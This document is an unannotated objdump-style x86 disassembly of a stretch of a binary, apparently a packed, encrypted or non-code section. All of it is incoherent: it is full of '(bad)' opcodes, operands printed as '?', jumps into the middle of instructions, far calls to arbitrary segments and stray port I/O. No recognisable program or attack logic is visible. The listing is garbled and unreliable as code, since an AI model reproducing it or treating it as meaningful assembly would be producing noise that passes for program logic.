  40e8ee:	test   eax,0xd75664f
  40e8f3:	call   0xfedd9284
  40e8f8:	push   0xffffffc8
  40e8fa:	fdiv   QWORD PTR [edi+eiz*8-0x1d]
  40e8fe:	sbb    esp,ebp
  40e900:	jmp    0x296bec3a
  40e905:	mov    ecx,0x6de907c6
  40e90a:	inc    ecx
  40e90b:	in     al,dx
  40e90c:	cdq    
  40e90d:	(bad)  
  40e90e:	adc    DWORD PTR [eax],ecx
  40e910:	adc    eax,edx
  40e912:	cmp    eax,0x94e31eff
  40e917:	pop    ds
  40e918:	pushf  
  40e919:	(bad)  
  40e91a:	xchg   DWORD PTR [ebp+edi*8+0x61],edi
  40e91e:	adc    al,BYTE PTR [esi]
  40e920:	add    BYTE PTR [ecx-0x4d3d3838],dh
  40e926:	or     BYTE PTR [ebp-0xc7a1bb],cl
  40e92c:	jne    0x40e8f0
  40e92e:	xor    BYTE PTR [ecx+0x59],0xbd
  40e932:	push   0xf881
	...
  40e943:	add    BYTE PTR [edx-0x2],ch
  40e946:	add    eax,0xfe552f83
  40e94b:	je     0x40e8d1
  40e94d:	stos   DWORD PTR es:[edi],eax
  40e94e:	mov    esi,0x9b8c9
  40e953:	lea    eax,[edi+0x55]
  40e956:	dec    esi
  40e957:	push   0x6a
  40e959:	push   0xe8a20873
  40e95e:	pop    eax
  40e95f:	(bad)  
  40e960:	mov    ebp,0x9aec4376
  40e965:	push   0x57e20873
  40e96a:	push   esi
  40e96b:	(bad)  
  40e96c:	fld    QWORD PTR [ebx+0xb4801f6]
  40e972:	cmp    eax,0x49
  40e975:	inc    DWORD PTR ds:0xfe6c2f83
  40e97b:	je     0x40e9c1
  40e97d:	stos   DWORD PTR es:[edi],eax
  40e97e:	mov    esi,0x978c9
  40e983:	mov    ds:0x40eef2,eax
  40e988:	jg     0x40e9d8
  40e98a:	in     al,dx
  40e98b:	push   eax
  40e98c:	and    BYTE PTR [eax+0x701275fd],dh
  40e992:	dec    eax
  40e993:	pop    ecx
  40e994:	cmp    eax,0x75c56668
  40e999:	inc    ecx
  40e99a:	add    BYTE PTR [ebp+0x6a4e6bc7],cl
  40e9a0:	sti    
  40e9a1:	data16 jae 0x40e9b0
  40e9a4:	jge    0x40e9a4
  40e9a6:	pop    es
  40e9a7:	call   0x40e9ac
	...
  40e9b4:	add    BYTE PTR [eax],al
  40e9b6:	add    BYTE PTR [ebx-0x7e],ah
  40e9b9:	cwde   
  40e9ba:	dec    ah
  40e9bc:	in     al,0xc5
  40e9be:	pop    es
  40e9bf:	arpl   WORD PTR [ecx-0x73],di
  40e9c2:	jmp    0x40e9a4
  40e9c4:	loope  0x40e965
  40e9c6:	mov    WORD PTR [esi],ds
  40e9c8:	xchg   edx,eax
  40e9c9:	xor    ch,al
  40e9cb:	cmp    dh,BYTE PTR [ecx-0x5f]
  40e9ce:	(bad)  
  40e9cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9d0:	cmp    BYTE PTR [eax-0x5555e902],ah
  40e9d6:	dec    esi
  40e9d7:	sub    al,0xb3
  40e9d9:	mov    eax,ds:0x1331a30a
  40e9de:	dec    DWORD PTR [esi]
  40e9e0:	xchg   esi,eax
  40e9e1:	mov    eax,ds:0xddb57f74
  40e9e6:	std    
  40e9e7:	je     0x40ea3b
  40e9e9:	or     eax,0xa1adf6c0
  40e9ee:	je     0x40ea57
  40e9f0:	jne    0x40ea14
  40e9f2:	push   ebp
  40e9f3:	pop    esp
  40e9f4:	jl     0x40e9c1
  40e9f6:	shl    DWORD PTR [edi-0x54],0x37
  40e9fa:	mov    edi,DWORD PTR [edi]
  40e9fc:	mov    WORD PTR [edi],ss
  40e9fe:	or     al,0x3b
  40ea00:	pusha  
  40ea01:	and    al,0xff
  40ea03:	cmp    al,0x98
  40ea05:	ret    0x8073
  40ea08:	adc    ebx,DWORD PTR [eax]
  40ea0a:	adc    BYTE PTR [ebx+0x2460cc84],dl
  40ea10:	and    al,0x33
  40ea12:	push   0x4266eb
  40ea17:	adc    al,0xba
  40ea19:	cli    
  40ea1a:	inc    BYTE PTR [eax]
	...
  40ea28:	add    BYTE PTR [eax],al
  40ea2a:	xchg   esi,eax
  40ea2b:	nop
  40ea2c:	xor    bh,bh
  40ea2e:	mov    ss,WORD PTR [edx+ebp*4-0x5e241c1b]
  40ea35:	out    0xb6,eax
  40ea37:	jno    0x40e9da
  40ea39:	(bad)  
  40ea3a:	sbb    ch,bh
  40ea3c:	idiv   bh
  40ea3e:	pop    DWORD PTR ds:0x544af72
  40ea44:	jmp    0x506f00fb
  40ea49:	inc    esi
  40ea4a:	and    al,BYTE PTR ds:0x2f57180e
  40ea50:	jecxz  0x40e9f4
  40ea52:	aaa    
  40ea53:	or     eax,0x9ab55311
  40ea58:	cmc    
  40ea59:	sub    ah,BYTE PTR [ebx+0x5]
  40ea5c:	(bad)  
  40ea5d:	pusha  
  40ea5e:	cmp    al,0xc7
  40ea60:	sub    DWORD PTR [ebx+0x63],eax
  40ea63:	call   0x17d5:0xff091053
  40ea6a:	pop    ebx
  40ea6b:	lods   eax,DWORD PTR ds:[esi]
  40ea6c:	outs   dx,DWORD PTR ds:[esi]
  40ea6d:	mov    eax,ds:0x4509a85
  40ea72:	arpl   WORD PTR [edx+0x46ba2c7e],bp
  40ea78:	sub    BYTE PTR [esp+ebp*2],al
  40ea7b:	adc    ch,bl
  40ea7d:	sub    eax,0xc1b9a47
  40ea82:	dec    ebx
  40ea83:	xchg   DWORD PTR [ebp-0x16d2aa5f],ebx
  40ea89:	add    edi,DWORD PTR [ebx+ebx*2]
  40ea8c:	add    dh,al
	...
  40ea9a:	add    BYTE PTR [eax],al
  40ea9c:	add    BYTE PTR [ecx-0x485f16bc],ah
  40eaa2:	or     DWORD PTR [ebx],edx
  40eaa4:	add    BYTE PTR [eax+edx*1],dh
  40eaa7:	loope  0x40ea54
  40eaa9:	mov    ecx,0xbca16d9a
  40eaae:	add    eax,0x2cdeb0e9
  40eab3:	mov    al,ds:0x5605a245
  40eab8:	pop    ss
  40eab9:	pop    edi
  40eaba:	das    
  40eabb:	or     ah,BYTE PTR [ecx+0x38510d8f]
  40eac1:	cld    
  40eac2:	cdq    
  40eac3:	cmp    eax,0x5632c
  40eac8:	inc    esi
  40eac9:	and    DWORD PTR [edx],0x5a1aac2
  40eacf:	call   FWORD PTR [esp+ebp*2+0x6c1e232f]
  40ead6:	or     eax,0x9b03d4e8
  40eadb:	(bad)  
  40eadc:	and    BYTE PTR [ebp-0x1063ffff],bl
  40eae2:	lods   eax,DWORD PTR ds:[esi]
  40eae3:	and    BYTE PTR ds:0x83002c03,0x96
  40eaea:	call   0xe65a:0x47f8e174
  40eaf1:	ret    
  40eaf2:	mov    WORD PTR [ebp+ebx*8+0x48],es
  40eaf6:	aas    
  40eaf7:	inc    esp
  40eaf8:	sub    BYTE PTR [edi-0x66],ah
  40eafb:	je     0x40eade
  40eafd:	mov    eax,0xc6ff48
	...
  40eb0e:	add    BYTE PTR [eax],al
  40eb10:	ret    
  40eb11:	call   0xc108:0x10c3bd74
  40eb18:	dec    ecx
  40eb19:	aas    
  40eb1a:	jmp    FWORD PTR [esi-0x16fc3c67]
  40eb20:	xchg   ebp,eax
  40eb21:	mov    ebx,gs
  40eb23:	push   0x1c
  40eb25:	popf   
  40eb26:	imul   ebp,ecx,0x14fed47e
  40eb2c:	push   edi
  40eb2d:	lods   eax,DWORD PTR ds:[esi]
  40eb2e:	sbb    al,0x23
  40eb30:	add    bl,BYTE PTR [eax+0x21032488]
  40eb36:	imul   ebp,DWORD PTR ds:0xf4ff05a0,0x661bad58
  40eb40:	ret    
  40eb41:	xchg   edi,eax
  40eb42:	(bad)  
  40eb43:	aam    0xf4
  40eb45:	xchg   edi,eax
  40eb46:	je     0x40eb29
  40eb48:	mov    eax,0xc34e5a40
  40eb4d:	int    0xc1
  40eb4f:	add    BYTE PTR [esi],cl
  40eb51:	add    eax,0x81a68b55
  40eb56:	ret    0x20f8
  40eb59:	add    eax,0xef35346a
  40eb5e:	pop    es
  40eb5f:	call   0x3fc6da
  40eb64:	push   ebx
  40eb65:	aas    
  40eb66:	cld    
  40eb67:	push   0x4140e9
  40eb6c:	push   ebp
  40eb6d:	out    dx,eax
  40eb6e:	pop    es
  40eb6f:	call   0x3e51c5
	...
  40eb80:	add    BYTE PTR [eax],al
  40eb82:	add    al,dl
  40eb84:	add    al,0x68
  40eb86:	xchg   ebx,eax
  40eb87:	inc    BYTE PTR [ebx+0x0]
  40eb8a:	push   0x414035
  40eb8f:	test   DWORD PTR [esi+0x14b2953],edi
  40eb95:	call   0xfdb9413f
  40eb9a:	or     edi,DWORD PTR [edx+0x4f893efd]
  40eba0:	jns    0x40ec08
  40eba2:	mov    al,ah
  40eba4:	inc    ecx
  40eba5:	add    BYTE PTR [eax+0x7a],ch
  40eba8:	add    al,0xef
  40ebaa:	mov    esi,0x41423a22
  40ebaf:	dec    edx
  40ebb0:	ja     0x40ec25
  40ebb2:	clc    
  40ebb3:	cmc    
  40ebb4:	std    
  40ebb5:	pop    es
  40ebb6:	call   0x3fe485
  40ebbb:	bound  ecx,QWORD PTR [ecx-0x13b5bf48]
  40ebc1:	(bad)  
  40ebc2:	jmp    ebp
  40ebc4:	ss addr16 ret 0x4279
  40ebc9:	add    bh,bh
  40ebcb:	das    
  40ebcc:	jl     0x40ebcb
  40ebce:	jne    0x40ebe2
  40ebd0:	ins    BYTE PTR es:[edi],dx
  40ebd1:	je     0x40ec52
  40ebd3:	mov    ch,0x78
  40ebd5:	std    
  40ebd6:	jne    0x40ec3b
  40ebd8:	lods   al,BYTE PTR ss:[esi]
  40ebda:	dec    ecx
  40ebdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebdc:	inc    edi
  40ebdd:	lahf   
  40ebde:	(bad)  
  40ebdf:	jbe    0x40ec23
  40ebe1:	lahf   
  40ebe2:	je     0x40ec4f
  40ebe4:	ss popa 
  40ebe6:	pop    eax
	...
  40ebf3:	add    BYTE PTR [eax],al
  40ebf5:	add    ah,ch
  40ebf7:	into   
  40ebf8:	int3   
  40ebf9:	rcr    DWORD PTR [edi-0x52],0x37
  40ebfd:	mov    ecx,edi
  40ebff:	sub    cl,al
  40ec01:	sti    
  40ec02:	dec    ecx
  40ec03:	scas   al,BYTE PTR es:[edi]
  40ec04:	sub    BYTE PTR ds:0xe80a78cc,dh
  40ec0a:	inc    edx
  40ec0b:	push   ebp
  40ec0c:	popf   
  40ec0d:	(bad)  
  40ec0e:	jmp    0x4361:0xd4679e68
  40ec15:	add    BYTE PTR [eax+ebx*1-0x57bc17f5],ch
  40ec1c:	popf   
  40ec1d:	(bad)  
  40ec1e:	pushf  
  40ec1f:	cmp    BYTE PTR [eax-0x5569f102],ah
  40ec25:	mov    ebp,DWORD PTR [edx]
  40ec27:	scas   eax,DWORD PTR es:[edi]
  40ec28:	popf   
  40ec29:	enter  0xa1a1,0x2
  40ec2d:	push   ebp
  40ec2e:	call   0x78046de4
  40ec33:	xor    eax,DWORD PTR [edx+ebp*2]
  40ec36:	xor    eax,0x7b08174f
  40ec3b:	popf   
  40ec3c:	cmp    edi,edi
  40ec3e:	pop    esp
  40ec3f:	push   ss
  40ec40:	dec    eax
  40ec41:	cld    
  40ec42:	retf   
  40ec43:	xor    al,0x47
  40ec45:	inc    ecx
  40ec46:	arpl   WORD PTR [edi+0x17],bp
  40ec49:	or     BYTE PTR [ebx],bh
  40ec4b:	pop    eax
  40ec4c:	pushf  
  40ec4d:	(bad)  
  40ec4e:	cmp    al,0x80
  40ec50:	pop    ss
  40ec51:	cld    
  40ec52:	xor    al,0x92
  40ec54:	or     ch,al
  40ec56:	mov    ch,dh
  40ec58:	sahf   
  40ec59:	inc    BYTE PTR [eax]
	...
  40ec67:	add    BYTE PTR [eax],al
  40ec69:	sbb    ch,BYTE PTR [ebx+0x6]
  40ec6c:	add    BYTE PTR [esi-0x1e508dfb],dh
  40ec72:	rcr    DWORD PTR [ecx+ebp*1+0x63],0x2b
  40ec77:	push   ds
  40ec78:	lahf   
  40ec79:	(bad)  
  40ec7a:	or     eax,0x96949e41
  40ec7f:	inc    ebp
  40ec80:	mov    WORD PTR [edi-0x5fae2f67],ds
  40ec86:	inc    esp
  40ec87:	jmp    0x414e5c2a
  40ec8c:	popf   
  40ec8d:	fist   WORD PTR [esi-0x66b061db]
  40ec93:	sbb    eax,0xc2ad5b18
  40ec98:	cmp    al,0xc4
  40ec9a:	xchg   esi,eax
  40ec9b:	pop    ds
  40ec9c:	shl    DWORD PTR [eax+0x5],0x9c
  40eca0:	mov    cl,al
  40eca2:	and    BYTE PTR [edi+ebx*4],0x3a
  40eca6:	add    eax,0x10a5db83
  40ecab:	loope  0x40ec58
  40ecad:	scas   al,BYTE PTR es:[edi]
  40ecae:	cmp    eax,0x40eb9de6
  40ecb3:	(bad)  [ecx+ecx*8]
  40ecb6:	inc    ecx
  40ecb7:	sub    BYTE PTR [esp+eax*4],al
  40ecba:	adc    cl,ah
  40ecbc:	stos   DWORD PTR es:[edi],eax
  40ecbd:	scas   eax,DWORD PTR es:[edi]
  40ecbe:	cwde   
  40ecbf:	lds    ebx,FWORD PTR [ebp-0x6242ef8b]
  40ecc5:	test   DWORD PTR [ecx+eax*8],0xad960c9b
  40eccc:	retf   
	...
  40ecd9:	add    BYTE PTR [eax],al
  40ecdb:	add    BYTE PTR [edx],ah
  40ecdd:	add    ecx,ebp
  40ecdf:	ss call 0x5f588a8d
  40ece5:	lods   eax,DWORD PTR ds:[esi]
  40ece6:	push   ecx
  40ece7:	cmp    eax,0xc3e19644
  40ecec:	mov    al,0xf8
  40ecee:	adc    bh,cl
  40ecf0:	mov    al,ds:0x3b33e944
  40ecf5:	xor    eax,0x96c61600
  40ecfa:	dec    edi
  40ecfb:	outs   dx,BYTE PTR ds:[esi]
  40ecfc:	je     0x40ecf3
  40ecfe:	dec    edi
  40ecff:	data16 ins BYTE PTR es:[edi],dx
  40ed01:	or     eax,0x96d556e8
  40ed06:	inc    BYTE PTR [ecx-0x66]
  40ed09:	cmp    bh,bh
  40ed0b:	dec    esi
  40ed0c:	sub    ah,al
  40ed0e:	or     ebp,ecx
  40ed10:	sub    eax,0x1b6aeb8a
  40ed15:	mov    ss,WORD PTR [esi-0x3d]
  40ed18:	pusha  
  40ed19:	sub    edi,DWORD PTR [ecx]
  40ed1b:	cs je  0x40ed2b
  40ed1e:	call   0xfed785b8
  40ed23:	jo     0x40ed49
  40ed25:	cdq    
  40ed26:	mov    dl,ah
  40ed28:	jbe    0x40ed17
  40ed2a:	inc    eax
  40ed2b:	jmp    0x7d40c410
  40ed30:	push   esp
  40ed31:	sub    eax,0x521a5c4
  40ed36:	push   edi
  40ed37:	add    DWORD PTR [esi],ecx
  40ed39:	jmp    0xc5acd63d
  40ed3e:	jae    0x40ed86
	...
  40ed4c:	add    BYTE PTR [eax],al
  40ed4e:	add    BYTE PTR [esi-0x53],cl
  40ed51:	fld    DWORD PTR [ebp-0x12]
  40ed54:	xchg   esi,eax
  40ed55:	or     ch,BYTE PTR [ecx+0x2489306c]
  40ed5b:	fist   WORD PTR [esi-0x4b53e8c]
  40ed61:	(bad)  
  40ed62:	xor    al,0x5f
  40ed64:	lods   eax,DWORD PTR ds:[esi]
  40ed65:	test   DWORD PTR [esi+0x34fe96c7],esi
  40ed6b:	call   FWORD PTR [esi]
  40ed6d:	sbb    al,0xa6
  40ed6f:	ins    DWORD PTR es:[edi],dx
  40ed70:	std    
  40ed71:	out    0x20,eax
  40ed73:	out    dx,al
  40ed74:	xchg   ebx,eax
  40ed75:	(bad)  
  40ed76:	xchg   esi,eax
  40ed77:	ins    DWORD PTR es:[edi],dx
  40ed78:	lea    ebp,[ecx-0x36]
  40ed7b:	fistp  WORD PTR [ecx]
  40ed7d:	or     BYTE PTR [eax],al
  40ed7f:	shl    ah,cl
  40ed81:	(bad)  
  40ed82:	jmp    FWORD PTR [ebp+0x7b44d6e0]
  40ed88:	or     edi,edi
  40ed8a:	jne    0x40ed1e
  40ed8c:	pusha  
  40ed8d:	jae    0x40eded
  40ed8f:	jge    0x40ee02
  40ed91:	or     eax,eax
  40ed93:	ss xchg edi,eax
  40ed95:	dec    esi
  40ed96:	jmp    DWORD PTR [edi]
  40ed98:	jno    0x40ede8
  40ed9a:	call   DWORD PTR [edi]
  40ed9c:	add    eax,ebp
  40ed9e:	ins    BYTE PTR es:[edi],dx
  40ed9f:	push   esp
  40eda0:	jno    0x40ed9f
  40eda2:	call   0x3fbbe1
  40eda7:	sub    eax,0x52e8f7fb
  40edac:	into   
  40edad:	(bad)  
  40edae:	(bad)  
  40edaf:	jle    0x40ed66
  40edb1:	mov    esi,0xb9
	...
  40edc2:	ins    DWORD PTR es:[edi],dx
  40edc3:	jno    0x40edc2
  40edc5:	jmp    FWORD PTR [eax+0x22]
  40edc8:	aaa    
  40edc9:	pop    es
  40edca:	xlat   BYTE PTR ds:[ebx]
  40edcb:	mov    ebp,?
  40edcd:	jne    0x40ee2d
  40edcf:	jno    0x40ee44
  40edd1:	or     BYTE PTR [edx-0x6d],dl
  40edd4:	push   esi
  40edd5:	jmp    FWORD PTR [ebp-0x793d3730]
  40eddb:	or     BYTE PTR [ebp-0x75],dl
  40edde:	scas   al,BYTE PTR es:[edi]
  40eddf:	jo     0x40ee54
  40ede1:	or     al,0xb2
  40ede3:	dec    edi
  40ede4:	pop    esp
  40ede5:	jmp    FWORD PTR [ebp-0x708b3ffc]
  40edeb:	loopne 0x40edd2
  40eded:	inc    esp
  40edee:	dec    ebx
  40edef:	or     DWORD PTR [eax-0x18],edx
  40edf2:	sub    edi,ecx
  40edf4:	(bad)  
  40edf5:	dec    DWORD PTR [edx+0x70]
  40edf8:	jae    0x40ee0a
  40edfa:	jp     0x40ee6c
  40edfc:	jae    0x40ee06
  40edfe:	repnz xchg edx,eax
  40ee00:	aam    0xff
  40ee02:	in     eax,dx
  40ee03:	pusha  
  40ee04:	ins    BYTE PTR es:[edi],dx
  40ee05:	pop    edx
  40ee06:	arpl   WORD PTR [ebx-0x66],di
  40ee09:	enter  0xb221,0x2
  40ee0d:	push   ebp
  40ee0e:	call   0x2c04748c
  40ee13:	sti    
  40ee14:	sub    eax,0x9958b900
  40ee19:	je     0x40ee86
  40ee1b:	xchg   BYTE PTR [edx-0x72d4ebaa],cl
  40ee21:	inc    esp
  40ee22:	(bad)  
  40ee24:	fldcw  WORD PTR [ebp+0x0]
	...
  40ee33:	add    BYTE PTR [eax],al
  40ee35:	cmp    ebx,DWORD PTR [ebp+0x2]
  40ee38:	cmp    BYTE PTR [esi+ebx*4],0xe
  40ee3c:	pop    ecx
  40ee3d:	mov    edi,DWORD PTR ds:0x7b634140
  40ee43:	stos   BYTE PTR es:[edi],al
  40ee44:	fnstenv [edi]
  40ee46:	sahf   
  40ee47:	add    cl,BYTE PTR [ebx]
  40ee49:	mov    ds:0xcb56d659,eax
  40ee4e:	call   0x970ded79
  40ee53:	ret    0x9173
  40ee56:	and    eax,0x78bcf841
  40ee5b:	call   0xbb08:0x110b5969
  40ee62:	sub    ebx,DWORD PTR [ebx+0xf9aa4fe]
  40ee68:	clc    
  40ee69:	or     edx,eax
  40ee6b:	cdq    
  40ee6c:	je     0x40eed9
  40ee6e:	mov    dh,0x1b
  40ee70:	dec    DWORD PTR [edx+esi*4+0x478b7499]
  40ee77:	out    0xfe,eax
  40ee79:	mul    BYTE PTR [ebp-0x358b9456]
  40ee7f:	cdq    
  40ee80:	(bad)  
  40ee81:	test   ch,0xaa
  40ee84:	std    
  40ee85:	or     bl,BYTE PTR [ebx-0x67]
  40ee88:	sti    
  40ee89:	nop
  40ee8a:	pop    esp
  40ee8b:	pop    ebx
  40ee8c:	(bad)  
  40ee8d:	push   esp
  40ee8e:	push   es
  40ee8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee90:	call   0x6ace:0x2e06452
  40ee97:	xchg   ebp,eax
  40ee98:	adc    BYTE PTR [eax],al
	...
  40eea6:	add    BYTE PTR [eax],al
  40eea8:	aas    
  40eea9:	xchg   ebx,eax
  40eeaa:	adc    ecx,DWORD PTR [ebx+ecx*2]
  40eead:	daa    
  40eeae:	push   ds
  40eeaf:	fwait
  40eeb0:	sub    eax,0x60c5b033
  40eeb5:	add    eax,0x87088f1c
  40eeba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eebb:	xchg   edi,eax
  40eebc:	lods   eax,DWORD PTR ds:[esi]
  40eebd:	pop    ds
  40eebe:	jmp    0xd3d336f0
  40eec3:	or     edi,ebx
  40eec5:	or     BYTE PTR [esi-0x5c830266],bh
  40eecb:	xchg   edi,eax
  40eecc:	jmp    0xa42cc5a1
  40eed1:	add    eax,0x16e4da69
  40eed6:	test   eax,0xa849d22b
  40eedb:	add    ebp,DWORD PTR [ebx*4-0x6d331848]
  40eee2:	icebp  
  40eee3:	ret    
  40eee4:	push   eax
  40eee5:	out    0xbd,al
  40eee7:	stos   DWORD PTR es:[edi],eax
  40eee8:	xor    DWORD PTR [esi],esp
  40eeea:	push   cs
  40eeeb:	call   0x1d1c:0xfc7cc569
  40eef2:	jmp    0x8094a2fa
  40eef7:	sahf   
  40eef8:	and    BYTE PTR [ecx+ebp*8+0x33],al
  40eefc:	xchg   esp,eax
  40eefd:	sbb    cl,dh
  40eeff:	stos   DWORD PTR es:[edi],eax
  40ef00:	add    edx,DWORD PTR [ebx]
  40ef02:	ficomp WORD PTR [ecx-0x66d07f84]
  40ef08:	jge    0x40ee9b
  40ef0a:	sbb    esp,eax
	...
  40ef18:	add    BYTE PTR [eax],al
  40ef1a:	add    BYTE PTR [ebx+0x6d99c592],bh
  40ef20:	xchg   edi,eax
  40ef21:	mov    ds,esp
  40ef23:	pop    ebp
  40ef24:	sbb    BYTE PTR [eax],al
  40ef26:	test   eax,0xaefc18fa
  40ef2b:	fs std 
  40ef2d:	out    0x9b,eax
  40ef2f:	xchg   ecx,eax
  40ef30:	xchg   edx,eax
  40ef31:	(bad)  
  40ef32:	ds sbb ah,al
  40ef35:	add    ebp,ecx
  40ef37:	lea    edi,[esi-0x15]
  40ef3a:	push   0x23
  40ef3c:	stos   BYTE PTR es:[edi],al
  40ef3d:	add    ah,0x97
  40ef40:	loopne 0x40ef82
  40ef42:	jmp    0xa04507a7
  40ef47:	and    eax,0x5f02fffe
  40ef4c:	pop    ds
  40ef4d:	add    bl,dl
  40ef4f:	jmp    0x40eee3
  40ef51:	je     0x40ef40
  40ef53:	ss add eax,0xe7c8e96a
  40ef59:	sub    ch,cl
  40ef5b:	pusha  
  40ef5c:	jl     0x40efa2
  40ef5e:	inc    ecx
  40ef5f:	retf   0xf818
  40ef62:	push   ecx
  40ef63:	xor    DWORD PTR [edi+edi*8],ebp
  40ef66:	ss call 0x646febb4
  40ef6c:	(bad)  
  40ef6d:	(bad)  
  40ef6e:	pushf  
  40ef6f:	hlt    
  40ef70:	sbb    edi,edi
  40ef72:	push   ds
  40ef73:	push   esp
  40ef74:	add    DWORD PTR [edx-0x17],ebp
  40ef77:	mov    es,WORD PTR ds:0x91c7e5e8
  40ef7d:	(bad)  
  40ef7e:	je     0x40ef80
	...
  40ef8c:	add    BYTE PTR [eax],al
  40ef8e:	ins    BYTE PTR es:[edi],dx
  40ef8f:	cdq    
  40ef90:	dec    edi
  40ef91:	xchg   ebx,eax
  40ef92:	pusha  
  40ef93:	pop    ds
  40ef94:	add    BYTE PTR [ebx-0x11ffe46a],al
  40ef9a:	gs xchg ecx,eax
  40ef9c:	(bad)  
  40ef9d:	cld    
  40ef9e:	aaa    
  40ef9f:	loopne 0x40efe1
  40efa1:	jmp    0x614f41ab
  40efa6:	call   0xe82aee3c
  40efab:	cmp    ah,dh
  40efad:	add    cl,dh
  40efaf:	xchg   edi,eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x56]
  40efb3:	aad    0x69
  40efb5:	add    BYTE PTR [eax-0x5dff9769],ah
  40efbb:	test   eax,0x6e3a4143
  40efc0:	jae    0x40efb6
  40efc2:	in     eax,0xda
  40efc4:	jne    0xff9fdcd4
  40efca:	dec    edi
  40efcb:	jns    0x40efb3
  40efcd:	stos   DWORD PTR es:[edi],eax
  40efce:	dec    edx
  40efcf:	outs   dx,BYTE PTR ds:[esi]
  40efd0:	std    
  40efd1:	mov    DWORD PTR [edi+0x61],edi
  40efd4:	or     eax,eax
  40efd6:	push   ds
  40efd7:	cmp    eax,0x5ce275ff
  40efdc:	jmp    0x40f036
  40efde:	test   DWORD PTR [ebp-0x79],ebp
  40efe1:	inc    ebp
  40efe2:	xchg   esi,eax
  40efe3:	ins    DWORD PTR es:[edi],dx
  40efe4:	jae    0x40efd6
  40efe6:	mov    ds:0xa5ff513a,al
  40efeb:	ins    DWORD PTR es:[edi],dx
  40efec:	jae    0x40efd6
  40efee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efef:	(bad)  
  40eff0:	jmp    0x40eff1
	...
  40effe:	add    BYTE PTR [eax],al
  40f000:	add    BYTE PTR [edi-0x4d3198c],ch
  40f006:	ins    DWORD PTR es:[edi],dx
  40f007:	std    
  40f008:	or     ecx,DWORD PTR [edx-0x4597e500]
  40f00e:	add    al,0xef
  40f010:	mov    esi,0xe807ff65
  40f015:	lahf   
  40f016:	(bad)  
  40f018:	jmp    DWORD PTR [ebp-0x1]
  40f01b:	out    0xff,eax
  40f01d:	das    
  40f01e:	push   0x5cb275fd
  40f023:	pop    ebx
  40f024:	push   ebp
  40f025:	xchg   ebp,eax
  40f026:	js     0x40f025
  40f028:	jne    0x40efc0
  40f02a:	pop    ebx
  40f02b:	xchg   esp,eax
  40f02c:	pop    eax
  40f02d:	test   DWORD PTR [eax-0x3],edi
  40f030:	jne    0x40efdc
  40f032:	popa   
  40f033:	stc    
  40f034:	dec    edi
  40f035:	arpl   WORD PTR [edi-0x45f1756a],si
  40f03b:	mov    dl,BYTE PTR [ecx]
  40f03d:	ins    BYTE PTR es:[edi],dx
  40f03e:	ror    DWORD PTR [edi-0x6a69ee02],1
  40f044:	je     0x40f0a5
  40f046:	(bad)  
  40f047:	sbb    bl,BYTE PTR [eax+0x54]
  40f04a:	pop    edi
  40f04b:	int3   
  40f04c:	rcr    DWORD PTR [edi-0x62],0x2f
  40f050:	mov    esi,DWORD PTR [edi]
  40f052:	outs   dx,DWORD PTR ds:[esi]
  40f053:	adc    BYTE PTR [ebx+ecx*2],cl
  40f056:	xor    edi,DWORD PTR [eax]
  40f058:	push   DWORD PTR [ebx+eiz*4]
  40f05b:	ret    0x7a73
  40f05e:	test   BYTE PTR [eax],0x45
  40f061:	mov    ds:0xe8329e,al
	...
  40f072:	add    BYTE PTR [eax],al
  40f074:	mov    bl,0xfa
  40f076:	xchg   esi,eax
  40f077:	(bad)  
  40f078:	mov    bl,0x6
  40f07a:	inc    ebp
  40f07b:	mov    edi,0x2a9ea3
  40f080:	arpl   WORD PTR [edi],di
  40f082:	push   esi
  40f083:	addr16 pop eax
  40f085:	popa   
  40f086:	inc    ebx
  40f087:	add    BYTE PTR [ebx-0x4f7eec1],dl
  40f08d:	mov    ch,0x19
  40f08f:	jmp    esp
  40f091:	xor    eax,0xd6dc57d7
  40f096:	xchg   esi,eax
  40f097:	je     0x40f100
  40f099:	inc    esi
  40f09a:	jle    0x40f0f7
  40f09c:	int3   
  40f09d:	out    0xa,al
  40f09f:	ror    BYTE PTR [edi-0x4b],0x2a
  40f0a3:	or     al,0x26
  40f0a5:	pop    ebp
  40f0a6:	add    dl,BYTE PTR [eax-0x35]
  40f0a9:	xchg   edx,eax
  40f0aa:	jmp    FWORD PTR ss:[ebp+ebp*2+0x5de4412a]
  40f0b2:	add    ch,BYTE PTR [eax+0x63]
  40f0b5:	sahf   
  40f0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0b7:	mov    ebp,0x413fb30b
  40f0bc:	arpl   WORD PTR ds:0xfd0f9739,ax
  40f0c2:	rcl    dl,1
  40f0c4:	stc    
  40f0c5:	(bad)  
  40f0c6:	aad    0xab
  40f0c8:	push   0x2d
  40f0ca:	into   
  40f0cb:	xchg   esi,eax
  40f0cc:	fwait
  40f0cd:	ret    0x3f0
  40f0d0:	push   cs
  40f0d1:	jl     0x40f09f
  40f0d3:	and    BYTE PTR [eax],0x92
  40f0d6:	inc    edx
  40f0d7:	add    al,0x0
	...
  40f0e5:	add    BYTE PTR [eax],al
  40f0e7:	leave  
  40f0e8:	shr    DWORD PTR [ebp-0x2b62a4f0],1
  40f0ee:	xor    BYTE PTR [edi+ecx*4+0x6f],al
  40f0f2:	inc    eax
  40f0f3:	aas    
  40f0f4:	sbb    al,0xf3
  40f0f6:	xchg   esi,eax
  40f0f7:	scas   eax,DWORD PTR es:[edi]
  40f0f8:	std    
  40f0f9:	adc    BYTE PTR [ebx],0x2c
  40f0fc:	pop    DWORD PTR [ebp-0xc717fd7]
  40f102:	or     ecx,DWORD PTR [ebx]
  40f104:	sub    BYTE PTR [esi-0x6a],dh
  40f107:	adc    eax,0x9796cd1c
  40f10c:	std    
  40f10d:	push   eax
  40f10e:	aaa    
  40f10f:	add    al,0x8f
  40f111:	pop    ebp
  40f112:	xchg   esi,eax
  40f113:	ja     0x40f0a6
  40f115:	push   ebp
  40f116:	adc    BYTE PTR [ebx-0x63],ch
  40f119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f11a:	xor    ah,ch
  40f11c:	mov    gs,WORD PTR [edi]
  40f11e:	shl    DWORD PTR [eax+0x5],0x94
  40f122:	mov    cl,al
  40f124:	mov    ?,WORD PTR [ebx-0x730234f9]
  40f12a:	xchg   esi,eax
